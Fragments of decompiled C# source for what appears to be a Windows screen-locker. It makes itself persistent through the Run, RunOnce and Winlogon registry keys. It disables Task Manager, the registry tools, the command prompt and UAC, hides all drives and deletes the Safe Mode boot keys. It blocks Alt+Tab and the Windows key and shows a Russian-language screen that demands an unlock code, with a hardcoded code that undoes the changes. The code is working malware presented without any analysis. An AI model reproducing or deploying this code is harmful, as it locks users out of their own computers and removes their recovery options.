                                            if (m_FormBeingCreated.ContainsKey(typeof(T)))
                [HelpKeyword("My.Computer")]
                [HelpKeyword("My.Application")]
                [HelpKeyword("My.User")]
                [HelpKeyword("My.Forms")]
                [HelpKeyword("My.WebServices")]
                [HelpKeyword("My.Settings")]
                        ((Form)this).TransparencyKey = Color.White;
                                                RegistryKey[] obj = new RegistryKey[3]
                                                        ((ServerComputer)MyProject.Computer).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true),
                                                        ((ServerComputer)MyProject.Computer).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true),
                                                        ((ServerComputer)MyProject.Computer).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true)
                                                RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
                                                RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
                                                RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", writable: true);
                                                RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBSTOR", writable: true);
                                                RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true);
                                                RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Search", writable: true);
                                                registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                                                registryKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                                                registryKey.SetValue("DisableLockWorkStation", 1, RegistryValueKind.DWord);
                                                registryKey.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
                                                registryKey.SetValue("NoDispBackgroundPage", 1, RegistryValueKind.DWord);
                                                registryKey.SetValue("NoDispAppearancePage", 1, RegistryValueKind.DWord);
                                                registryKey.SetValue("consentpromptbehavioradmin", 0, RegistryValueKind.DWord);
                                                registryKey.SetValue("enablelua", 0, RegistryValueKind.DWord);
                                                registryKey.SetValue("promptonsecuredesktop", 0, RegistryValueKind.DWord);
                                                registryKey2.SetValue("StartMenuLogOff", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoClose", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoRun", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
                                                registryKey2.SetValue("HidePowerOptions", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoNetHood", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoWinKeys", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoFolderOptions", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoTrayContextMenu", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoSetTaskbar", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoFind", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoSecurityTab", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoDesktopContextMenu", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoCommonGroups", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoFileMenu", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoStartMenuMorePrograms", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoStartMenuMFUprogramsList", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoPropertiesMyComputer", 1, RegistryValueKind.DWord);
                                                registryKey2.SetValue("NoThemesTab", 1, RegistryValueKind.DWord);
                                                registryKey3.DeleteSubKeyTree("Minimal", throwOnMissingSubKey: false);
                                                registryKey3.DeleteSubKeyTree("Network", throwOnMissingSubKey: false);
                                                registryKey4.SetValue("Start", 4, RegistryValueKind.DWord);
                                                registryKey5.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
                                                registryKey6.SetValue("BingSearchEnabled", 0, RegistryValueKind.DWord);
                                                registryKey6.SetValue("SearchboxTaskbarMode", 0, RegistryValueKind.DWord);
                                                registryKey.Close();
                                                registryKey2.Close();
                                                registryKey3.Close();
                                                registryKey4.Close();
                                                registryKey5.Close();
                                                registryKey6.Close();
                                                        ((ServerComputer)MyProject.Computer).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue("WIN32_" + Conversions.ToString(num), new Random().Next(100000, 999999));
                [AccessedThroughProperty("bypasserr")]
                private Timer _bypasserr;
                [field: AccessedThroughProperty("keytext")]
                internal virtual Label keytext
                                KeyEventHandler val = new KeyEventHandler(_o_program_KeyDown);
                                KeyPressEventHandler val2 = new KeyPressEventHandler(method_3);
                                KeyEventHandler val3 = new KeyEventHandler(method_7);
                                        ((Control)val4).KeyDown -= val;
                                        ((Control)val4).KeyPress -= val2;
                                        ((Control)val4).KeyDown -= val3;
                                        ((Control)val4).KeyDown += val;
                                        ((Control)val4).KeyPress += val2;
                                        ((Control)val4).KeyDown += val3;
                [field: AccessedThroughProperty("ByPassMessage")]
                internal virtual Panel ByPassMessage
                [field: AccessedThroughProperty("ByPassWarnMsg")]
                internal virtual Label ByPassWarnMsg
                internal virtual Timer bypasserr
                                return _bypasserr;
                                Timer val = _bypasserr;
                                _bypasserr = value;
                                val = _bypasserr;
                        bypasserr = new Timer(components);
                        ByPassMessage = new Panel();
                        ByPassWarnMsg = new Label();
                        keytext = new Label();
                        ((Control)ByPassMessage).SuspendLayout();
                        bypasserr.Interval = 10;
                        ((Control)main).Controls.Add((Control)(object)ByPassMessage);
                        ((Control)ByPassMessage).Anchor = (AnchorStyles)0;
                        ((Control)ByPassMessage).Controls.Add((Control)(object)c3);
                        ((Control)ByPassMessage).Controls.Add((Control)(object)c2);
                        ((Control)ByPassMessage).Controls.Add((Control)(object)c4);
                        ((Control)ByPassMessage).Controls.Add((Control)(object)c1);
                        ((Control)ByPassMessage).Controls.Add((Control)(object)ByPassWarnMsg);
                        ((Control)ByPassMessage).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)204);
                        ((Control)ByPassMessage).ForeColor = Color.FromArgb(192, 0, 0);
                        ((Control)ByPassMessage).Location = new Point(324, 208);
                        ((Control)ByPassMessage).Name = "ByPassMessage";
                        ((Control)ByPassMessage).Size = new Size(373, 178);
                        ((Control)ByPassMessage).TabIndex = 18;
                        ((Control)ByPassMessage).Visible = false;
                        ((Control)ByPassWarnMsg).BackColor = Color.FromArgb(192, 0, 0);
                        ((Control)ByPassWarnMsg).Dock = (DockStyle)5;
                        ((Control)ByPassWarnMsg).Font = new Font("Lucida Console", 14.25f);
                        ((Control)ByPassWarnMsg).ForeColor = Color.White;
                        ((Control)ByPassWarnMsg).Location = new Point(0, 0);
                        ((Control)ByPassWarnMsg).Name = "ByPassWarnMsg";
                        ((Control)ByPassWarnMsg).Size = new Size(373, 178);
                        ((Control)ByPassWarnMsg).TabIndex = 0;
                        ByPassWarnMsg.Text = "Замечена и остановлена попытка обмануть систему!";
                        ByPassWarnMsg.TextAlign = (ContentAlignment)32;
                        ((Control)a2).Controls.Add((Control)(object)keytext);
                        ((Control)keytext).BackColor = Color.Transparent;
                        ((Control)keytext).Font = new Font("Lucida Console", 15.75f);
                        ((Control)keytext).Location = new Point(3, 8);
                        ((Control)keytext).Name = "keytext";
                        ((Control)keytext).Size = new Size(807, 24);
                        ((Control)keytext).TabIndex = 4;
                        keytext.Text = "Введи код разблокировки:";
                        keytext.TextAlign = (ContentAlignment)2;
                        ((Control)ByPassMessage).ResumeLayout(false);
                private void _o_program_KeyDown(object sender, KeyEventArgs e)
                                if (e.Alt && (int)e.KeyCode == 9)
                                if ((int)e.KeyCode == 91)
                                if ((int)e.KeyCode == 13)
                                if (Operators.CompareString(hdn.Text, "ExceptionKey", false) == 0)
                private void method_3(object sender, KeyPressEventArgs e)
                        e.Handled = !LikeOperator.LikeString(Conversions.ToString(e.KeyChar), "[a-z,A-Z\b,0-9]", (CompareMethod)0);
                                        ((ServerComputer)MyProject.Computer).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).DeleteValue("WIN32_" + Conversions.ToString(num));
                                RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
                                RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
                                RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", writable: true);
                                RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBSTOR", writable: true);
                                RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true);
                                RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Search", writable: true);
                                registryKey.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
                                registryKey.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
                                registryKey.SetValue("DisableLockWorkStation", 0, RegistryValueKind.DWord);
                                registryKey.SetValue("DisableChangePassword", 0, RegistryValueKind.DWord);
                                registryKey.SetValue("NoDispBackgroundPage", 0, RegistryValueKind.DWord);
                                registryKey.SetValue("NoDispAppearancePage", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("StartMenuLogOff", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoClose", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoControlPanel", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoRun", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoViewOnDrive", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoDrives", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("HidePowerOptions", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoDesktop", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoNetHood", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoWinKeys", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoFolderOptions", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoViewContextMenu", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoTrayContextMenu", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoSetTaskbar", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoFind", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoSecurityTab", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoDesktopContextMenu", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoCommonGroups", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoFileMenu", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoStartMenuMorePrograms", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoStartMenuMFUprogramsList", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoPropertiesMyComputer", 0, RegistryValueKind.DWord);
                                registryKey2.SetValue("NoThemesTab", 0, RegistryValueKind.DWord);
                                registryKey3.SetValue("", "Minimal");
                                registryKey3.SetValue("", "Network");
                                registryKey4.SetValue("Start", 3, RegistryValueKind.DWord);
                                registryKey5.SetValue("DisableCMD", 0, RegistryValueKind.DWord);
                                registryKey6.SetValue("BingSearchEnabled", 1, RegistryValueKind.DWord);
                                registryKey6.SetValue("SearchboxTaskbarMode", 1, RegistryValueKind.DWord);
                                registryKey.Close();
                                registryKey2.Close();
                                registryKey3.Close();
                                registryKey4.Close();
                                registryKey5.Close();
                                registryKey6.Close();
                                ((ServerComputer)MyProject.Computer).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true);
                                RegistryKey[] obj = new RegistryKey[3]
                                        ((ServerComputer)MyProject.Computer).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true),
                                        ((ServerComputer)MyProject.Computer).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true),
                                        ((ServerComputer)MyProject.Computer).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true)
                private void method_7(object sender, KeyEventArgs e)
                        if ((int)e.KeyCode == 13)
                        return bypasserr;
                        ((Control)ByPassMessage).Visible = true;
                                ((Control)ByPassWarnMsg).ForeColor = Color.FromArgb(192, 0, 0);
                                ((Control)ByPassWarnMsg).BackColor = Color.White;
                                ((Control)ByPassWarnMsg).ForeColor = Color.White;
                                ((Control)ByPassWarnMsg).BackColor = Color.FromArgb(192, 0, 0);
                                        ((Control)ByPassWarnMsg).ForeColor = Color.White;
                                        ((Control)ByPassWarnMsg).BackColor = Color.FromArgb(192, 0, 0);
                                        ((Control)ByPassMessage).Visible = false;
                                ((Control)ByPassWarnMsg).ForeColor = Color.FromArgb(192, 0, 0);
                                ((Control)ByPassWarnMsg).BackColor = Color.White;
